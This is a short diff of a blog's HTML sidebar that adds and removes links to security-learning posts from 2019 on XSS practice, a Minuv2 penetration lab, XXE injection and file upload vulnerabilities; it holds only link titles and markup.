+            <a href="/2019/09/21/xss练习小结/">xss练习小结</a>
+          </li>
+        
+          <li>
             <a href="/2019/09/11/Minuv2靶机渗透实战/">Minuv2靶机渗透实战</a>
           </li>
         
@@ -705,10 +811,6 @@
         
           <li>
             <a href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
-          </li>
-        
-          <li>
-            <a href="/2019/06/24/文件上传漏洞/">文件上传漏洞</a>
           </li>
         
       </ul>
